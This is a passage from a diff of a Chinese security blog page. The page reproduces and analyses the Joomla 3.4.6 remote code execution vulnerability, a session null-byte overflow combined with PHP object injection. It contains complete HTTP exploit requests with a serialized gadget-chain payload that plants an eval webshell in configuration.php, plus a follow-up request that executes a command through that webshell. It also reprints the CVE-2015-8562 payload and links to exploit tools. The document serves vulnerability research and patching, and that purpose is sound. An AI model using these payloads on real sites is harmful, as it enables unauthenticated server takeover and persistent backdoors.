+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /Joomla/3.4.6/index.php/component/users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: dc674b0eef3d2412c63832504cf5ac18=bg7tprkie898gu5luh1it52ga3</span><br><span class="line">Content-Length: 1136</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&amp;password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A217%3A%22file_put_contents%28%27configuration.php%27%2C%27if%28isset%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%29+eval%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%3B%27%2C+FILE_APPEND%29+%7C%7C+%24a%3D%27http%3A%2F%2Fwtf%27%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&amp;option=com_users&amp;task=user.login&amp;03b291424900343c59f58ad131d087a7=1</span><br></pre></td></tr></table></figure>
+
+<p>5.连接webshell测试是否写入成功<br><img src="https://p1.ssl.qhimg.com/t01c41149da3c4df1c4.png" alt><br>通过burpeuite抓到的请求包4：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /Joomla/3.4.6//configuration.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 70</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay=echo+%27PWNED%27%3B</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="#漏洞分析"></a>#漏洞分析</h3><p>这个漏洞是和Joomla的会话的运作机制有关，Joomla 会话以 PHP Objects 的形式存储在数据库中且由 PHP 会话函数处理，但是由于Mysql无法保存Null 字节，函数在将session写入数据库和读取时会对象因大小不正确而导致不合法从而溢出。因为未认证用户的会话也可存储，所以该对象注入 (Object Injection) 可以在未登录认证的情况下攻击成功，导致RCE。</p>
+<p><strong>1.溢出</strong><br>当我们在 Joomla中执行 POST 请求时，通常会有303重定向将我们重定向至结果页。这是利用的重要事项，因为第一个请求（含参数）将只会导致 Joomla 执行动作并存储（例如调用write() 函数）会话，之后303重定向将进行检索（如调用read() 函数）并将信息显示给用户。</p>
+<p>漏洞利用文件<br>‘libraries/joomla/session/storage/database.php’中定义的函数 read()和 write()由session_set_save_handler()设置，作为‘libraries/joomla/session/session.php:__start’ session_start() 调用的读和写处理程序。<br>由于Mysql无法保存Null 字节，libraries/joomla/session/storage/database.php的write函数在将数据存储到数据库之前（write函数）会用‘\0\0\0’替换‘\x00\x2a\x00’(chr(0).’<em>’.chr(0))，而在序列化对象中， $protected 变量被赋予‘\x00\x2a\x00’前缀。<br><img src="https://p4.ssl.qhimg.com/t0172a850d77d06da72.png" alt><br>当读取数据库中的数据时， read 函数会用‘\x00\x2a\x00’（N</em>N）替换‘\0\0\0’，重构原始对象。<br><img src="https://p2.ssl.qhimg.com/t0135f90532615cba3e.png" alt><br>这种替换的主要问题在于它用3个字节替换了6个字节。这种代码在Joomla3.0.0到3.4.6 版本中一直存在。从 3.4.7 版本开始，会话是 base64 编码形式存储在数据库中。<br>如之前所述，我们能够通过动作参数的读取和写入来操纵该会话对象进行注入将被3个字节替换的‘\0\0\0’，导致对象因大小不正确（字节长度不同）导致不合法，造成溢出。<br><strong>举个栗子</strong><br>比如一个登录表单，在 username 字段中放入‘my\x00\x2a\x00username’，经过write函数处理后将在数据库中得到如下对象：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">当该会话对象被 read 函数中读取时，‘\0\0\0’将被以如上所述方式所替代，得到如下值：</span><br><span class="line">```s:8:s:&quot;username&quot;;s:16:&quot;myN*Nusername&quot; --&gt;不合法的大小```  </span><br><span class="line">被替换的字符串只有13个字节长，但生命的字符串长度仍然是16个字节！</span><br><span class="line">就可以愉快地利用这种“溢出”构造一个可以实现 RCE 的一个新的对象，在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。</span><br><span class="line">在本次曝光的Poc中就是用username字段进行溢出，password字段进行对象注入，如果插入任意serialize字符串，构造反序列化漏洞了，到这里就和之前的漏洞CVE-2015-8562的比较相似了。</span><br><span class="line"></span><br><span class="line">**2. 对象注入（反序列化）**  (本部分参考PHITHON的博客)</span><br><span class="line">CVE-2015-8562的Poc如下</span><br></pre></td></tr></table></figure>
+
+<p>User-Agent: 123}__test|O:21:”JDatabaseDriverMysqli”:3:{s:4:”\0\0\0a”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:5:”cache”;b:1;s:19:”cache_name_function”;s:6:”assert”;s:10:”javascript”;i:9999;s:8:”feed_url”;s:37:”phpinfo();JFactory::getConfig();exit;”;}i:1;s:4:”init”;}}s:13:”\0\0\0connection”;i:1;}4</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在这个执行链中，分别利用了如下类：</span><br><span class="line">JDatabaseDriverMysqli</span><br><span class="line">SimplePie</span><br><span class="line"></span><br><span class="line">**2.1 JDatabaseDriverMysqli类**  </span><br><span class="line">我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作：</span><br></pre></td></tr></table></figure>
+
+<p>&lt;?php<br>public function __destruct()<br>    {<br>        $this-&gt;disconnect();<br>    }<br>    …<br>    public function disconnect()<br>    {<br>        // Close the connection.<br>        if ($this-&gt;connection)<br>        {<br>            foreach ($this-&gt;disconnectHandlers as $h)<br>            {<br>                call_user_func_array($h, array( &amp;$this));<br>            }</p>
+<pre><code>        mysqli_close($this-&gt;connection);
+    }
+
+    $this-&gt;connection = null;
+} </code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用__destruct，__destruct将会调用disconnect，disconnect里有一处敏感函数：call_user_func_array。</span><br><span class="line"></span><br><span class="line">但很明显，这里的call_user_func_array的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。</span><br><span class="line"></span><br><span class="line">于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数[new SimplePie(), &apos;init&apos;]，传入call_user_func_array。</span><br><span class="line"></span><br><span class="line">跟进init方法：</span><br></pre></td></tr></table></figure>
+
+<p>&lt;?php<br>function init()<br>    {<br>        // Check absolute bare minimum requirements.<br>        if ((function_exists(‘version_compare’) &amp;&amp; version_compare(PHP_VERSION, ‘4.3.0’, ‘&lt;’)) || !extension_loaded(‘xml’) || !extension_loaded(‘pcre’))<br>        {<br>            return false;<br>        }<br>        …<br>        if ($this-&gt;feed_url !== null || $this-&gt;raw_data !== null)<br>        {<br>            $this-&gt;data = array();<br>            $this-&gt;multifeed_objects = array();<br>            $cache = false;</p>
+<pre><code>if ($this-&gt;feed_url !== null)
+{
+    $parsed_feed_url = SimplePie_Misc::parse_url($this-&gt;feed_url);
+    // Decide whether to enable caching
+    if ($this-&gt;cache &amp;&amp; $parsed_feed_url[&apos;scheme&apos;] !== &apos;&apos;)
+    {
+        $cache = call_user_func(array($this-&gt;cache_class, &apos;create&apos;), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), &apos;spc&apos;);</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">很明显，其中这两个call_user_func将是触发代码执行的元凶。</span><br><span class="line"></span><br><span class="line">所以，可以将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。</span><br><span class="line"></span><br><span class="line">**2.2 SimplePie类** </span><br><span class="line">默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：</span><br><span class="line">![](https://p4.ssl.qhimg.com/t01f77bceb29dffd587.png)</span><br><span class="line">而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。</span><br><span class="line">P牛的Poc</span><br></pre></td></tr></table></figure>
+
+<p>O:21:”JDatabaseDriverMysqli”:3:{s:4:”\0\0\0a”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:5:”cache”;b:1;s:19:”cache_name_function”;s:6:”assert”;s:10:”javascript”;i:9999;s:8:”feed_url”;s:37:”phpinfo();JFactory::getConfig();exit;”;}i:1;s:4:”init”;}}s:13:”\0\0\0connection”;i:1;}ð</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前面讲过由于Joomla的会话机制Post请求会被303重定向到结果页面所以无法回显,这里的phpinfo函数就用不了</span><br><span class="line">选择用file_put_contents函数写入一句话到configuration.php中</span><br></pre></td></tr></table></figure>
+
+<p>file_put_contents(‘configuration.php’,’if(isset($_POST[\&#39;test\&#39;])) eval($_POST[\&#39;test\&#39;]);&#39;, FILE_APPEND) || $a=&#39;<a href="http://wtf\&#39;" target="_blank" rel="noopener">http://wtf\&#39;</a>;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最终的对象如下：</span><br></pre></td></tr></table></figure>
+
+<p>AAA”;s:11:”maonnalezzo”:O:21:”JDatabaseDriverMysqli”:3:{s:4:”\0\0\0a”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:5:”cache”;b:1;s:19:”cache_name_function”;s:6:”assert”;s:10:”javascript”;i:9999;s:8:”feed_url”;s:217:”file_put_contents(‘configuration.php’,’if(isset($_POST[&#39;ja0k&#39;]))+eval($_POST[&#39;ja0k&#39;]);’,+FILE_APPEND)+||+$a=’<a href="http://wtf&#39;;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\0\0\0connection&quot;;i:1;}s:6:&quot;return&quot;;s:102" target="_blank" rel="noopener">http://wtf&#39;;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\0\0\0connection&quot;;i:1;}s:6:&quot;return&quot;;s:102</a>:</p>
+<pre><code>
+
+### \#修复建议
+
+更新至最新版本
+官方地址https://downloads.joomla.org
+
+**代码及工具下载：**  
+https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE
+
+**免责声明：本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。**
+
+参考：  
+[1].https://cxsecurity.com/issue/WLB-2019100045  
+[2].https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html  
+[3].https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA </code></pre>
       
     </div>
     
@@ -511,11 +523,11 @@
         <ul class="post-copyright">
   <li class="post-copyright-author">
     <strong>本文作者：</strong>
-    Ja0K
+    Ja0k
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/" title="【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？">https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/</a>
+    <a href="https://securitycn.github.io/2019/10/10/bobao-360/" title>https://securitycn.github.io/2019/10/10/bobao-360/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -528,16 +540,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
-          
-            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
-          
-            <a href="/tags/安全研究/" rel="tag"># 安全研究</a>
-          
-        </div>
-      
 
       
       
@@ -547,8 +549,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/" rel="next" title="漏洞分析-CVE-2019-12922_phpMyAdmin小于等于4.9.0.1CSRF漏洞分析">
-                <i class="fa fa-chevron-left"></i> 漏洞分析-CVE-2019-12922_phpMyAdmin小于等于4.9.0.1CSRF漏洞分析
+              <a href="/2019/10/09/漏洞复现-Joomla-3-4-6远程代码执行漏洞原理分析和Poc/" rel="next" title="漏洞复现-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造">
+                <i class="fa fa-chevron-left"></i> 漏洞复现-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造
               </a>
             
           </div>
@@ -556,10 +558,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/09/漏洞复现-Joomla-3-4-6远程代码执行漏洞原理分析和Poc/" rel="prev" title="漏洞复现-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造">
-                漏洞复现-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -753,7 +751,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">#概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Fastjson反序列化漏洞系列1-什么是fastjson反序列化？"><span class="nav-number">2.</span> <span class="nav-text">[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是Fastjson？"><span class="nav-number">2.1.</span> <span class="nav-text">#什么是Fastjson？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fastjson反序列化框架"><span class="nav-number">2.2.</span> <span class="nav-text">#Fastjson反序列化框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Demo演示FastJson反序列化实现过程"><span class="nav-number">2.3.</span> <span class="nav-text">#Demo演示FastJson反序列化实现过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#动态调试理解调用链"><span class="nav-number">2.4.</span> <span class="nav-text">#动态调试理解调用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#造成远程命令执行的原因？"><span class="nav-number">2.5.</span> <span class="nav-text">#造成远程命令执行的原因？</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#事件背景"><span class="nav-number">1.</span> <span class="nav-text">#事件背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响范围"><span class="nav-number">2.</span> <span class="nav-text">#影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">#漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp攻击链分析"><span class="nav-number">4.</span> <span class="nav-text">#Exp攻击链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">5.</span> <span class="nav-text">#漏洞分析</span></a></li></ol></div>
             
 
           </div>
